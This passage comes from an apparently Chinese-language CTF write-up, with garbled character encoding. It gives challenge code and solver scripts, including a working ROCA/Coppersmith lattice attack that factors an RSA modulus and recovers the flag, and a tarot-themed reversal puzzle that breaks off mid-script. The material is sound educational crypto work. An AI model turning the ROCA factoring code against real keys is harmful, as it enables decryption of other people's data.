class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> prime<br><br>FLAG=<span class="hljs-string">b&#x27;hgame&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span><br>e=<span class="hljs-number">0x10001</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">primorial</span>(<span class="hljs-params">num</span>):<br>    result = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, num + <span class="hljs-number">1</span>):<br>        result *= prime(i)<br>    <span class="hljs-keyword">return</span> result<br>M=primorial(random.choice([<span class="hljs-number">39</span>,<span class="hljs-number">71</span>,<span class="hljs-number">126</span>]))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_key</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        k = getPrime(random.randint(<span class="hljs-number">20</span>,<span class="hljs-number">40</span>))<br>        a = getPrime(random.randint(<span class="hljs-number">20</span>,<span class="hljs-number">60</span>))<br>        p = k * M + <span class="hljs-built_in">pow</span>(e, a, M)<br>        <span class="hljs-keyword">if</span> isPrime(p):<br>            <span class="hljs-keyword">return</span> p<br><br>p,q=gen_key(),gen_key()<br>n=p*q<br>m=bytes_to_long(FLAG)<br>enc=<span class="hljs-built_in">pow</span>(m,e,n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;n=&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;enc=&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p>æ”¹ä¹‹åå°±æ˜¯rocaï¼Œå¥—è„šæœ¬å°±å¥½äº†</p><p>é€šè¿‡encçš„å€¼å¯ä»¥åˆ¤æ–­å¯†é’¥ç©ºé—´å¤§å°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">## Coppersmith-howgrave</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">coppersmith_howgrave</span>(<span class="hljs-params">f, N, beta, m, t, R</span>):<br>    <span class="hljs-comment">#Check if parameters are within bounds</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span> &lt; beta &lt;= <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;beta not in (0, 1]&#x27;</span><br>    <span class="hljs-keyword">assert</span> f.is_monic(), <span class="hljs-string">&#x27;f is not monic&#x27;</span><br>    <br>    <span class="hljs-comment">#get delta and the matrix dimension</span><br>    delta = f.degree()<br>    n = delta * m + t<br>    <br>    <span class="hljs-comment">#Building the polynomials</span><br>    fZ = f.change_ring(ZZ) <span class="hljs-comment">#change the ring from Zmod(N) to ZZ</span><br>    x = fZ.parent().gen()  <span class="hljs-comment">#make x a variable in ZZ</span><br>    f_list = [] <br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(delta):<br>            <span class="hljs-comment">#We want them ordered that&#x27;s we have N^(m-ii1) and fZ^ii</span><br>            f_list.append(((x*R)^j) * N^(m-ii) * fZ(x*R)^(ii)) <span class="hljs-comment">#the g_&#123;i,j&#125;</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(t):<br>        f_list.append((x*R)^ii * fZ(x*R)^m) <span class="hljs-comment">#the h_i</span><br>        <br>    <span class="hljs-comment">#Build the lattice</span><br>    B = matrix(ZZ, n) <span class="hljs-comment"># n = delta * m + t</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ii+<span class="hljs-number">1</span>):<br>            B[ii, j] = f_list[ii][j]<br>            <br>    <span class="hljs-comment">#LLL it</span><br>    B_lll = B.LLL(early_red = <span class="hljs-literal">True</span>, use_siegel = <span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment">#take the shortest vector to construct our new poly g</span><br>    g = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        g += x^ii * B_lll[<span class="hljs-number">0</span>, ii] / R^ii<br>    <br>    <span class="hljs-comment">#factor the polynomial</span><br>    potential_roots = g.roots()<br>    <span class="hljs-comment">#print(&#x27;potential roots:&#x27;, potential_roots)</span><br>    <br>    <span class="hljs-comment">#we don&#x27;t need to do this Since our we test in our roca function</span><br><span class="hljs-comment">#     #test roots</span><br><span class="hljs-comment">#     roots = []</span><br><span class="hljs-comment">#     for r in potential_roots:</span><br><span class="hljs-comment">#         if r[0].is_integer():</span><br><span class="hljs-comment">#             res = fZ(ZZ(r[0]))</span><br><span class="hljs-comment">#             if gcd(N, res) &gt;= N^beta:</span><br><span class="hljs-comment">#                 roots.append(ZZ(r[0]))</span><br>    <span class="hljs-comment">#print(&#x27;roots:&#x27;, roots)</span><br>    <span class="hljs-keyword">return</span> potential_roots<br>    <span class="hljs-comment">#return roots</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">roca</span>(<span class="hljs-params">N, M_prime, g, m, t, beta</span>):<br>    g = <span class="hljs-built_in">int</span>(g)<br>    c_prime = discrete_log(Zmod(M_prime)(N), Zmod(M_prime)(g))<br>    ord_M_prime = Zmod(M_prime)(g).multiplicative_order()<br>    <br>    <span class="hljs-comment">#search boundaries</span><br>    bottom = c_prime // <span class="hljs-number">2</span> <br>    top =(c_prime + ord_M_prime) // <span class="hljs-number">2</span> <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;numbers to check&#x27;</span>,   top - bottom, <span class="hljs-string">&#x27; between &#x27;</span>, (bottom, top))<br><br>    <br>    <span class="hljs-comment">#constants for coppersmith</span><br>    P.&lt;x&gt; = PolynomialRing(Zmod(N))<br>    epsilon = beta / <span class="hljs-number">7</span><br>    X = floor(<span class="hljs-number">2</span> * N^beta / M_prime)<br>    <br>    <span class="hljs-comment">#the search</span><br>    <span class="hljs-keyword">for</span> i, a <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">range</span>(bottom, top)):<br>        <span class="hljs-keyword">if</span> i % <span class="hljs-number">1000</span> == <span class="hljs-number">0</span>: <span class="hljs-comment">#count iterations</span><br>            <span class="hljs-built_in">print</span>(i)<br>            <br>        <span class="hljs-comment">#construct polynomial</span><br>        f = x + <span class="hljs-built_in">int</span>((inverse_mod(M_prime, N)) * <span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(g, a, M_prime)))<br><br>        <span class="hljs-comment">#roots = f.small_roots(X, beta, epsilon) #coppersmith</span><br>        roots = coppersmith_howgrave(f, N, beta, m, t, X)<br>        <span class="hljs-comment">#check solutions</span><br>        <span class="hljs-keyword">for</span> k_prime, _ <span class="hljs-keyword">in</span> roots:<br>            p = <span class="hljs-built_in">int</span>(k_prime * M_prime) + <span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(g, a, M_prime))<br>            <span class="hljs-keyword">if</span> N % p == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">return</span> p, N//p<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span><br>n=<span class="hljs-number">787190064146025392337631797277972559696758830083248285626115725258876808514690830730702705056550628756290183000265129340257928314614351263713241</span><br>e=<span class="hljs-number">65537</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_M1_m_t_values</span>(<span class="hljs-params">key_size</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-number">512</span> &lt;= key_size &lt; <span class="hljs-number">1024</span>:<br>        m = <span class="hljs-number">5</span><br>        M1=<span class="hljs-number">0x1b3e6c9433a7735fa5fc479ffe4027e13bea</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-number">1024</span> &lt;= key_size &lt; <span class="hljs-number">2048</span>:<br>        m = <span class="hljs-number">4</span><br>        M1=<span class="hljs-number">0x24683144f41188c2b1d6a217f81f12888e4e6513c43f3f60e72af8bd9728807483425d1e</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-number">2048</span> &lt;= key_size &lt; <span class="hljs-number">3072</span>:<br>        m = <span class="hljs-number">6</span><br>        M1=<span class="hljs-number">0x016928dc3e47b44daf289a60e80e1fc6bd7648d7ef60d1890f3e0a9455efe0abdb7a748131413cebd2e36a76a355c1b664be462e115ac330f9c13344f8f3d1034a02c23396e6</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-number">3072</span> &lt;= key_size &lt; <span class="hljs-number">4096</span>:<br>        m = <span class="hljs-number">25</span><br>    <span class="hljs-keyword">else</span>:<br>        m = <span class="hljs-number">7</span><br>    <span class="hljs-keyword">return</span> M1,m, m+<span class="hljs-number">1</span><br>M_prime,m, t = get_M1_m_t_values(<span class="hljs-number">512</span>)<br>p, q = roca(n, M_prime, e, m, t, <span class="hljs-number">.5</span>) <br><span class="hljs-keyword">assert</span>(p*q==n)<br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-built_in">print</span>(q)<br>enc=<span class="hljs-number">365164788284364079752299551355267634718233656769290285760796137651769990253028664857272749598268110892426683253579840758552222893644373690398408</span><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(enc,inverse_mod(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)),n))))<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">24000</span><br><span class="hljs-string">954455861490902893457047257515590051179337979243488068132318878264162627</span><br><span class="hljs-string">824752716083066619280674937934149242011126804999047155998788143116757683</span><br><span class="hljs-string">b&#x27;hgame&#123;ROCA_ROCK_and_ROll!&#125;&#x27;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="ancient-recall"><a class="markdownIt-Anchor" href="#ancient-recall"></a> Ancient Recall</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br>Major_Arcana = [<span class="hljs-string">&quot;The Fool&quot;</span>, <span class="hljs-string">&quot;The Magician&quot;</span>, <span class="hljs-string">&quot;The High Priestess&quot;</span>,<span class="hljs-string">&quot;The Empress&quot;</span>, <span class="hljs-string">&quot;The Emperor&quot;</span>, <span class="hljs-string">&quot;The Hierophant&quot;</span>,<span class="hljs-string">&quot;The Lovers&quot;</span>, <span class="hljs-string">&quot;The Chariot&quot;</span>, <span class="hljs-string">&quot;Strength&quot;</span>,<span class="hljs-string">&quot;The Hermit&quot;</span>, <span class="hljs-string">&quot;Wheel of Fortune&quot;</span>, <span class="hljs-string">&quot;Justice&quot;</span>,<span class="hljs-string">&quot;The Hanged Man&quot;</span>, <span class="hljs-string">&quot;Death&quot;</span>, <span class="hljs-string">&quot;Temperance&quot;</span>,<span class="hljs-string">&quot;The Devil&quot;</span>, <span class="hljs-string">&quot;The Tower&quot;</span>, <span class="hljs-string">&quot;The Star&quot;</span>,<span class="hljs-string">&quot;The Moon&quot;</span>, <span class="hljs-string">&quot;The Sun&quot;</span>, <span class="hljs-string">&quot;Judgement&quot;</span>,<span class="hljs-string">&quot;The World&quot;</span>]<br>wands = [<span class="hljs-string">&quot;Ace of Wands&quot;</span>, <span class="hljs-string">&quot;Two of Wands&quot;</span>, <span class="hljs-string">&quot;Three of Wands&quot;</span>, <span class="hljs-string">&quot;Four of Wands&quot;</span>, <span class="hljs-string">&quot;Five of Wands&quot;</span>, <span class="hljs-string">&quot;Six of Wands&quot;</span>, <span class="hljs-string">&quot;Seven of Wands&quot;</span>, <span class="hljs-string">&quot;Eight of Wands&quot;</span>, <span class="hljs-string">&quot;Nine of Wands&quot;</span>, <span class="hljs-string">&quot;Ten of Wands&quot;</span>, <span class="hljs-string">&quot;Page of Wands&quot;</span>, <span class="hljs-string">&quot;Knight of Wands&quot;</span>, <span class="hljs-string">&quot;Queen of Wands&quot;</span>, <span class="hljs-string">&quot;King of Wands&quot;</span>]<br>cups = [<span class="hljs-string">&quot;Ace of Cups&quot;</span>, <span class="hljs-string">&quot;Two of Cups&quot;</span>, <span class="hljs-string">&quot;Three of Cups&quot;</span>, <span class="hljs-string">&quot;Four of Cups&quot;</span>, <span class="hljs-string">&quot;Five of Cups&quot;</span>, <span class="hljs-string">&quot;Six of Cups&quot;</span>, <span class="hljs-string">&quot;Seven of Cups&quot;</span>, <span class="hljs-string">&quot;Eight of Cups&quot;</span>, <span class="hljs-string">&quot;Nine of Cups&quot;</span>, <span class="hljs-string">&quot;Ten of Cups&quot;</span>, <span class="hljs-string">&quot;Page of Cups&quot;</span>, <span class="hljs-string">&quot;Knight of Cups&quot;</span>, <span class="hljs-string">&quot;Queen of Cups&quot;</span>, <span class="hljs-string">&quot;King of Cups&quot;</span>]<br>swords = [<span class="hljs-string">&quot;Ace of Swords&quot;</span>, <span class="hljs-string">&quot;Two of Swords&quot;</span>, <span class="hljs-string">&quot;Three of Swords&quot;</span>, <span class="hljs-string">&quot;Four of Swords&quot;</span>, <span class="hljs-string">&quot;Five of Swords&quot;</span>, <span class="hljs-string">&quot;Six of Swords&quot;</span>, <span class="hljs-string">&quot;Seven of Swords&quot;</span>, <span class="hljs-string">&quot;Eight of Swords&quot;</span>, <span class="hljs-string">&quot;Nine of Swords&quot;</span>, <span class="hljs-string">&quot;Ten of Swords&quot;</span>, <span class="hljs-string">&quot;Page of Swords&quot;</span>, <span class="hljs-string">&quot;Knight of Swords&quot;</span>, <span class="hljs-string">&quot;Queen of Swords&quot;</span>, <span class="hljs-string">&quot;King of Swords&quot;</span>]<br>pentacles = [<span class="hljs-string">&quot;Ace of Pentacles&quot;</span>, <span class="hljs-string">&quot;Two of Pentacles&quot;</span>, <span class="hljs-string">&quot;Three of Pentacles&quot;</span>, <span class="hljs-string">&quot;Four of Pentacles&quot;</span>, <span class="hljs-string">&quot;Five of Pentacles&quot;</span>, <span class="hljs-string">&quot;Six of Pentacles&quot;</span>, <span class="hljs-string">&quot;Seven of Pentacles&quot;</span>, <span class="hljs-string">&quot;Eight of Pentacles&quot;</span>, <span class="hljs-string">&quot;Nine of Pentacles&quot;</span>, <span class="hljs-string">&quot;Ten of Pentacles&quot;</span>, <span class="hljs-string">&quot;Page of Pentacles&quot;</span>, <span class="hljs-string">&quot;Knight of Pentacles&quot;</span>, <span class="hljs-string">&quot;Queen of Pentacles&quot;</span>, <span class="hljs-string">&quot;King of Pentacles&quot;</span>]<br>Minor_Arcana = wands + cups + swords + pentacles<br>tarot = Major_Arcana + Minor_Arcana<br>reversals = [<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>]<br><br>Value = []<br>cards = []<br>YOUR_initial_FATE = []<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(YOUR_initial_FATE)&lt;<span class="hljs-number">5</span>:<br>    card = random.choice(tarot)<br>    <span class="hljs-keyword">if</span> card <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> cards:<br>        cards.append(card)<br>        <span class="hljs-keyword">if</span> card <span class="hljs-keyword">in</span> Major_Arcana:<br>            k = random.choice(reversals)<br>            Value.append(tarot.index(card)^k)<br>            <span class="hljs-keyword">if</span> k == -<span class="hljs-number">1</span>:<br>                YOUR_initial_FATE.append(<span class="hljs-string">&quot;re-&quot;</span>+card)<br>            <span class="hljs-keyword">else</span>:<br>                YOUR_initial_FATE.append(card)<br>        <span class="hljs-keyword">else</span>:<br>            Value.append(tarot.index(card))<br>            YOUR_initial_FATE.append(card)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Oops!lets reverse 1T!&quot;</span>)<br><br>FLAG=(<span class="hljs-string">&quot;hgame&#123;&quot;</span>+<span class="hljs-string">&quot;&amp;&quot;</span>.join(YOUR_initial_FATE)+<span class="hljs-string">&quot;&#125;&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;_&quot;</span>)<br><br>YOUR_final_Value = Value<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Fortune_wheel</span>(<span class="hljs-params">FATE</span>):<br>    FATEd = [FATE[i]+FATE[(i+<span class="hljs-number">1</span>)%<span class="hljs-number">5</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(FATE))]<br>    <span class="hljs-keyword">return</span> FATEd<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">250</span>):<br>    YOUR_final_Value = Fortune_wheel(YOUR_final_Value)<br><span class="hljs-built_in">print</span>(YOUR_final_Value)<br>YOUR_final_FATE = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> YOUR_final_Value:<br>    YOUR_final_FATE.append(tarot[i%<span class="hljs-number">78</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Your destiny changed!\n&quot;</span>,<span class="hljs-string">&quot;,&quot;</span>.join(YOUR_final_FATE))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;oh,now you GET th3 GOOd lU&gt;k,^^&quot;</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Oops!lets reverse 1T!</span><br><span class="hljs-string">[2532951952066291774890498369114195917240794704918210520571067085311474675019, 2532951952066291774890327666074100357898023013105443178881294700381509795270, 2532951952066291774890554459287276604903130315859258544173068376967072335730, 2532951952066291774890865328241532885391510162611534514014409174284299139015, 2532951952066291774890830662608134156017946376309989934175833913921142609334]</span><br><span class="hljs-string">Your destiny changed!</span><br><span class="hljs-string"> Eight of Cups,Ace of Cups,Strength,The Chariot,Five of Swords</span><br><span class="hljs-string">oh,now you GET th3 GOOd lU&gt;k,^^</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br></code></pre></td></tr></table></figure><p>é€†ç€åˆ†æä¸€ä¸‹å°±å¥½äº†</p><p>å°±è®²ä¸€ä¸‹é€†<code>YOUR_final_Value</code>è¿™ä¸ª</p><p>è®°ä¸Šä¸€ä¸ªçŠ¶æ€ä¸º<code>a,b,c,d,e</code>ï¼Œåˆ™ä¸‹ä¸€ä¸ªçŠ¶æ€ä¸º<code>a+b,b+c,c+d,d+e,e+a</code></p><p>ä¹‹åçœ‹ä»£ç é‡Œå°±èƒ½ç†è§£äº†<code>e+a-a-b+b+c-c-d+d+e=2e</code>ï¼Œç„¶åä¸€ä¸ªä¸ªæ±‚å‡ºæ¥å°±å¯ä»¥è¿˜åŸäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python">Major_Arcana = [<span class="hljs-string">&quot;The Fool&quot;</span>, <span class="hljs-string">&quot;The Magician&quot;</span>, <span class="hljs-string">&quot;The High Priestess&quot;</span>,<span class="hljs-string">&quot;The Empress&quot;</span>, <span class="hljs-string">&quot;The Emperor&quot;</span>, <span class="hljs-string">&quot;The Hierophant&quot;</span>,<span class="hljs-string">&quot;The Lovers&quot;</span>, <span class="hljs-string">&quot;The Chariot&quot;</span>, <span class="hljs-string">&quot;Strength&quot;</span>,<span class="hljs-string">&quot;The Hermit&quot;</span>, <span class="hljs-string">&quot;Wheel of Fortune&quot;</span>, <span class="hljs-string">&quot;Justice&quot;</span>,<span class="hljs-string">&quot;The Hanged Man&quot;</span>, <span class="hljs-string">&quot;Death&quot;</span>, <span class="hljs-string">&quot;Temperance&quot;</span>,<span class="hljs-string">&quot;The Devil&quot;</span>, <span class="hljs-string">&quot;The Tower&quot;</span>, <span class="hljs-string">&quot;The Star&quot;</span>,<span class="hljs-string">&quot;The Moon&quot;</span>, <span class="hljs-string">&quot;The Sun&quot;</span>, <span class="hljs-string">&quot;Judgement&quot;</span>,<span class="hljs-string">&quot;The World&quot;</span>]<br>wands = [<span class="hljs-string">&quot;Ace of Wands&quot;</span>, <span class="hljs-string">&quot;Two of Wands&quot;</span>, <span class="hljs-string">&quot;Three of Wands&quot;</span>, <span class="hljs-string">&quot;Four of Wands&quot;</span>, <span class="hljs-string">&quot;Five of Wands&quot;</span>, <span class="hljs-string">&quot;Six of Wands&quot;</span>, <span class="hljs-string">&quot;Seven of Wands&quot;</span>, <span class="hljs-string">&quot;Eight of Wands&quot;</span>, <span class="hljs-string">&quot;Nine of Wands&quot;</span>, <span class="hljs-string">&quot;Ten of Wands&quot;</span>, <span class="hljs-string">&quot;Page of Wands&quot;</span>, <span class="hljs-string">&quot;Knight of Wands&quot;</span>, <span class="hljs-string">&quot;Queen of Wands&quot;</span>, <span class="hljs-string">&quot;King of Wands&quot;</span>]<br>cups = [<span class="hljs-string">&quot;Ace of Cups&quot;</span>, <span class="hljs-string">&quot;Two of Cups&quot;</span>, <span class="hljs-string">&quot;Three of Cups&quot;</span>, <span class="hljs-string">&quot;Four of Cups&quot;</span>, <span class="hljs-string">&quot;Five of Cups&quot;</span>, <span class="hljs-string">&quot;Six of Cups&quot;</span>, <span class="hljs-string">&quot;Seven of Cups&quot;</span>, <span class="hljs-string">&quot;Eight of Cups&quot;</span>, <span class="hljs-string">&quot;Nine of Cups&quot;</span>, <span class="hljs-string">&quot;Ten of Cups&quot;</span>, <span class="hljs-string">&quot;Page of Cups&quot;</span>, <span class="hljs-string">&quot;Knight of Cups&quot;</span>, <span class="hljs-string">&quot;Queen of Cups&quot;</span>, <span class="hljs-string">&quot;King of Cups&quot;</span>]<br>swords = [<span class="hljs-string">&quot;Ace of Swords&quot;</span>, <span class="hljs-string">&quot;Two of Swords&quot;</span>, <span class="hljs-string">&quot;Three of Swords&quot;</span>, <span class="hljs-string">&quot;Four of Swords&quot;</span>, <span class="hljs-string">&quot;Five of Swords&quot;</span>, <span class="hljs-string">&quot;Six of Swords&quot;</span>, <span class="hljs-string">&quot;Seven of Swords&quot;</span>, <span class="hljs-string">&quot;Eight of Swords&quot;</span>, <span class="hljs-string">&quot;Nine of Swords&quot;</span>, <span class="hljs-string">&quot;Ten of Swords&quot;</span>, <span class="hljs-string">&quot;Page of Swords&quot;</span>, <span class="hljs-string">&quot;Knight of Swords&quot;</span>, <span class="hljs-string">&quot;Queen of Swords&quot;</span>, <span class="hljs-string">&quot;King of Swords&quot;</span>]<br>pentacles = [<span class="hljs-string">&quot;Ace of Pentacles&quot;</span>, <span class="hljs-string">&quot;Two of Pentacles&quot;</span>, <span class="hljs-string">&quot;Three of Pentacles&quot;</span>, <span class="hljs-string">&quot;Four of Pentacles&quot;</span>, <span class="hljs-string">&quot;Five of Pentacles&quot;</span>, <span class="hljs-string">&quot;Six of Pentacles&quot;</span>, <span class="hljs-string">&quot;Seven of Pentacles&quot;</span>, <span class="hljs-string">&quot;Eight of Pentacles&quot;</span>, <span class="hljs-string">&quot;Nine of Pentacles&quot;</span>, <span class="hljs-string">&quot;Ten of Pentacles&quot;</span>, <span class="hljs-string">&quot;Page of Pentacles&quot;</span>, <span class="hljs-string">&quot;Knight of Pentacles&quot;</span>, <span class="hljs-string">&quot;Queen of Pentacles&quot;</span>, <span class="hljs-string">&quot;King of Pentacles&quot;</span>]<br>Minor_Arcana = wands + cups + swords + pentacles<br>tarot = Major_Arcana + Minor_Arcana<br>reversals = [<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>]<br><br>YOUR_final_Value=[<span class="hljs-number">2532951952066291774890498369114195917240794704918210520571067085311474675019</span>, <span class="hljs-number">2532951952066291774890327666074100357898023013105443178881294700381509795270</span>, <span class="hljs-number">2532951952066291774890554459287276604903130315859258544173068376967072335730</span>, <span class="hljs-number">2532951952066291774890865328241532885391510162611534514014409174284299139015</span>, <span class="hljs-number">2532951952066291774890830662608134156017946376309989934175833913921142609334</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_Fortune_wheel</span>(<span class="hljs-params">FATEd</span>):<br>    f0 = (FATEd[<span class="hljs-number">4</span>] - FATEd[<span class="hljs-number">3</span>] + FATEd[<span class="hljs-number">2</span>] - FATEd[<span class="hljs-number">1</span>] + FATEd[<span class="hljs-number">0</span>]) // <span class="hljs-number">2</span><br>    f1 = FATEd[<span class="hljs-number">0</span>] - f0<br>    f2 = FATEd[<span class="hljs-number">1</span>] - f1<br>    f3 = FATEd[<span class="hljs-number">2</span>] - f2<br>    f4 = FATEd[<span class="hljs-number">3</span>] - f3<br>    <span class="hljs-keyword">return</span> [f0, f1, f2, f3, f4]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">250</span>):<br>    YOUR_final_Value = 